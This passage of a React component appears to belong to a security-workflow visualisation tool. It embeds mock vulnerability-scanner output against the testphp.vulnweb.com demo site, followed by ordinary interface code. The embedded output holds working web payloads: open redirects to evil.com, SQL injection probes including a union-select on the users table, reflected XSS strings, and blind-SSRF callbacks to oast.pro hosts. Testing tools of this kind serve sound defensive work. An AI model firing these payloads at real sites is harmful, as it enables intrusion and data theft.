      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&mr:referralID=255c5619-cbb9-11ed-83ba-12a9c0fb0737
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&BannerClickID=30762292&AffiliateID=ayFJWpGmVP5dqiqsij/cZA==&ASCampaignID=yUrcihPILTWjfcF+1Brm/Q==&ASFrontpageID=1
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&authCookie
      [open-redirect] [http] [medium] http://testphp.vulnweb.com:80/redir.php?r=https://evil.com
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&utm_medium=banner/user/profile/13323https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&utm_source&utm_medium&utm_content&utm_campaign
      [open-redirect] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://evil.com&e&rurl=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?artist=123'&asdf=ff'&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E' ["check the manual that corresponds to your MySQL server version","SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?artist=123'"><43973&amp;asdf=ff&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?artist=123'&amp;asdf=ff'&amp;cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E'&zfdfasdf=124fffff' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?cat=123%22' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?cat=' ["SQL syntax; check the manual that corresponds to your MySQL","Warning: mysql_","check the manual that corresponds to your MySQL server version"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/listproducts.php?id=1' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?cat=123%22'"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?aaaa%2f&p=%25'"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?cat=123%22%3E%3Cscript%3Ealert(45)%3C/script%3E'"><43973&zfdfasdf=124fffff
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?cat='"><43973
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/product.php?pic=1%20OR%2017-' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/hpp/params.php?aaaa%2f&p=%3CscRipt%3Ealert(0x107E91)%3C%2fscRipt%3E'"><43973&pp=12
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(column_name)+from+information_schema.columns+where+table_name='users'+--'"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com:80/hpp/?pp=12'"><43973
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com:80/hpp/index.php?pp=12'"><43973
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/search.php?test=query'&cat=123'&ppl=1fhhahwul' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/search.php?test=hello2' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com/search.php?test=query' ["Warning: mysql_"]
      [reflected-xss] [http] [medium] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E'"><43973
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gssidcuifh9hzx.oast.pro&utm_medium=banner/user/profile/13323https://www.quangcaoso.net/2021/03/?utm_source=&utm_medium=banner
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gx3sgf6jxgemmg.oast.pro&mr:referralID=255c5619-cbb9-11ed-83ba-12a9c0fb0737
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gyhzzhmd7p6k1c.oast.pro&utm_source&utm_medium=banner
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com:80/redir.php?r=https://cmq1109ohb9s73fe2u0gnhwt5e1jw4mfu.oast.pro
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gq4y1nde9jtazh.oast.pro&utm_source=connecting&utm_medium=email&utm_campaign=2013.
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gk39pkxuofuu9y.oast.pro&BannerClickID=30762292&AffiliateID=ayFJWpGmVP5dqiqsij/cZA==&ASCampaignID=yUrcihPILTWjfcF+1Brm/Q==&ASFrontpageID=1
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gbf1ibxnp9akcm.oast.pro&utm_source&utm_medium&utm_content&utm_campaign
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gzupwjbpiree99.oast.pro&e&rurl=https://www.quangcaoso.net/2020/12/?KNL=$$$IDdestinatario$$$
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gicbu38hrgtjjs.oast.pro&authCookie
      [blind-ssrf] [http] [medium] http://testphp.vulnweb.com/redir.php?r=https://cmq1109ohb9s73fe2u0gsnrwhuyctpysq.oast.pro&KNL=$$$IDdestinatario$$$&NNL=13500&CNL=10&HNL=3481a
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com:80/bxss/vuln.php?id=1' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com:80/AJAX/infocateg.php?id=1' ["Warning: mysql_"]
      [sqli-error-based:mysql] [http] [critical] http://testphp.vulnweb.com:80/artists.php?artist=1' ["Warning: mysql_"]`;
      ctx.reactFlowInstance.getNode("recursively-cat-all-1").data.tool.duration = "00:00:05";
      ctx.setTest(Math.random());
      ctx.setRunStart(false);
    }, 105000);
  };

  useEffect(() => {
    // Add event listener for keydown when the component mounts
    window.addEventListener("keydown", handleKeyDown);

    // Remove event listener when the component unmounts
    return () => {
      window.removeEventListener("keydown", handleKeyDown);
    };
  }, [handleKeyDown]);

  const commandLinePreview = "<-- Command line preview -->";
  const customStyle = {
    ...monokaiSublime,
    backgroundColor: "#2e56a4",
    padding: "15px",
  };
  return (
    <div
      id="container"
      className="relative w-full max-h-full overflow-hidden h-full border-r-[1px] bg-primary1 border-l-[1px] border-red-900">
      <ReactFlowProvider>
        <div
          className={`reactflow-wrapper w-full transition-primary ${commandIsOpen ? "h-3/5" : "h-[calc(100%-2.5rem)]"} `}
          ref={reactFlowWrapper}>
          <ReactFlow
            nodes={ctx.nodes}
            edges={ctx.edges}
            onNodesChange={ctx.onNodesChange}
            onEdgesChange={ctx.onEdgesChange}
            nodeTypes={nodeTypes}
            elementsSelectable={true}
            style={{ background: "#000", border: "none" }}
            connectionLineStyle={connectionLineStyle}
            defaultEdgeOptions={defaultEdgeOptions}
            onConnect={onConnect}
            onLoad={onLoad}
            onInit={ctx.setReactFlowInstance}
            onDrop={onDrop}
            onDragOver={onDragOver}
            isValidConnection={isValidConnection}
            proOptions={{ hideAttribution: true }}
            onSelectionChange={onSelectionChange}
            onConnectStart={onConnectStart}>
            <Controls
              position="top-left"
              className="text-white z-0 bg-white rounded-md hover:rounded-md flex flex-row-reverse controls"
            />
            <div className="w-full h-full relative">
              <div className="z-20 absolute flex gap-3 top-3 left-1/2 transform -translate-x-1/2 ">
                <button
                  onClick={() => {
                    if (ctx.builder) {
                      setLoadingStart(true);
                      setTimeout(() => {
                        setLoadingStart(false);
                        ctx.setBuilder(false);
                        run();
                      }, 2000);
                    }
                  }}
                  className="bg-primary1 border-[1px] border-gray-700 w-9 h-9">
                  <FontAwesomeIcon className="text-[#dedede]" icon={faPlay} />
                </button>
                <button
                  onClick={handleSaveClick}
                  className="bg-primary1 border-[1px] border-gray-700 w-9 h-9">
                  <FontAwesomeIcon className="text-[#dedede]" icon={faFloppyDisk} />
                </button>
                <button
                  onClick={handleLoadClick}
                  className="bg-primary1 border-[1px] border-gray-700 w-9 h-9">
                  <FontAwesomeIcon className="text-[#dedede]" icon={faUpload} />
                </button>
                <button
                  onClick={loadSavedMap}
                  className="bg-red-500 p-2">
                  load test map
                </button>
              </div>

              {loadingStart && (
                <div className="loading-container w-full transition-curtain z-20 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
                  <div className="loading-circle z-20"></div>
                  <div className="w-full h-full absolute transition-primary z-10 bg-[#dedede] opacity-10"></div>
                </div>
              )}
            </div>
          </ReactFlow>
        </div>
      </ReactFlowProvider>

      <div
        //onClick={() => setCommandIsOpen(!commandIsOpen)}
        className="h-10 cursor-default bg-black border-t-[1px] border-red-primary flex">
        <p
          className={`${activeSec == "command" ? "bg-primary1" : ""} px-4 flex items-center w-fit uppercase tracking-widest font-bold spa  h-full text-center font-[Consolas] text-white`}
          onClick={() => {
            setActiveSec("command");
          }}>
          Command
        </p>
        {!ctx.builder && (
          <p
            className={`${activeSec == "output" ? "bg-primary1" : ""} transition-primary transition-primary px-4 flex items-center w-fit uppercase tracking-widest font-bold spa  h-full text-center font-[Consolas] text-white`}
            onClick={() => {
              setActiveSec("output");
            }}>
            output
          </p>
        )}
        {!ctx.builder && (
          <p
            className={`${activeSec == "stdout" ? "bg-primary1" : ""} transition-primary px-4 flex items-center w-fit uppercase tracking-widest font-bold spa  h-full text-center font-[Consolas] text-white`}
            onClick={() => {
              setActiveSec("stdout");
            }}>
            stdout
          </p>
        )}
        {!ctx.builder && (
          <p
            className={`${activeSec == "stderr" ? "bg-primary1" : ""} transition-primary px-4 flex items-center w-fit uppercase tracking-widest font-bold spa  h-full text-center font-[Consolas] text-white`}
            onClick={() => {
              setActiveSec("stderr");
            }}>
            stderr
          </p>
        )}
      </div>
      {activeSec == "command" && (
        <div className={`bg-primary1  h-[calc(40%-2.5rem)] ${!commandIsOpen ? "translate-y-full" : ""} transition-primary transition-curtain`}>
          <p className="px-4 pt-4 font-[Consolas] font-bold text-slate-300">{commandLinePreview}</p>
          {command && (
            <SyntaxHighlighter
              lineProps={{ style: { wordBreak: "break-all", whiteSpace: "pre-wrap" } }}
              wrapLines={true}
              className=" w-full test1 overflow-x-hidden overflow-y-auto"
              language="elixir"
              style={customStyle}>
              {command}
            </SyntaxHighlighter>
          )}
          {!command && nodeType == "inputNode" && <p className="flex text-stroke items-center justify-center font-[Consolas] text-slate-300 font-extrabold text-3xl h-[calc(100%-2.5rem)] transition-curtain">input node doesn&apos;t have command</p>}
          {!command && <p className="flex items-center justify-center font-[Consolas] text-slate-300 font-extrabold text-3xl h-[calc(100%-2.5rem)] transition-curtain">No node selected!</p>}
        </div>
      )}
      {activeSec == "output" && (
        <div
          data-test={ctx.test}
          className={`bg-primary1  h-[calc(40%-2.5rem)] ${!commandIsOpen ? "translate-y-full" : ""} transition-primary transition-curtain`}>
          <p className="px-4 pt-4 font-[Consolas] scrollbar font-bold text-slate-300  max-h-full max-w-full overflow-y-auto overflow-x-clip">{ctx.selectedNode ? ctx.selectedNode.data.tool.output : ""}</p>
        </div>
      )}
      {activeSec == "stdout" && (
        <div
          data-test={ctx.test}
          className={`bg-primary1  h-[calc(40%-2.5rem)] ${!commandIsOpen ? "translate-y-full" : ""} transition-primary transition-curtain`}>
          <p className="px-4 pt-4 font-[Consolas] font-bold scrollbar text-slate-300  max-h-full max-w-full overflow-y-auto overflow-x-clip">{ctx.selectedNode ? ctx.selectedNode.data.tool.stdout : ""}</p>
        </div>
      )}
      {activeSec == "stderr" && (
        <div
          data-test={ctx.test}
          className={`bg-primary1  h-[calc(40%-2.5rem)] ${!commandIsOpen ? "translate-y-full" : ""} transition-primary transition-curtain`}>
          <p className="px-4 pt-4 font-[Consolas] scrollbar font-bold max-h-full max-w-full overflow-y-auto  overflow-x-clip text-slate-300">{ctx.selectedNode ? ctx.selectedNode.data.tool.stderr : ""}</p>
        </div>
      )}

      <div>
        <input
          type="text"
          name="title"
        />

        <button
          id="AddNode"
          onClick={ctx.addNode}
          className="p-3 rounded-md bg-gray-700 hover:bg-gray-600 focus:outline-none">
          Add Node
        </button>
      </div>
      <div>
        <button
          id="SaveMindMap"
          onClick={handleSaveClick}
          className="p-3 rounded-md bg-gray-700 hover:bg-gray-600 focus:outline-none">
          Save Mind Map
        </button>
        <button
          id="LoadMindMap"
          className="p-3 rounded-md bg-gray-700 hover:bg-gray-600 focus:outline-none"
          onClick={handleLoadClick}>
          Load Mind MapLoad Mind Map
        </button>
        <button
          id="LoadMindMap"
          className="p-3 rounded-md bg-gray-700 hover:bg-gray-600 focus:outline-none">
          Test
        </button>
        <button
          id="RefreshPage"
          className="p-3 rounded-md bg-gray-700 hover:bg-gray-600 focus:outline-none"
          onClick={refreshPage}>
          Refresh
        </button>
      </div>
    </div>
  );
};

export default MindNode;
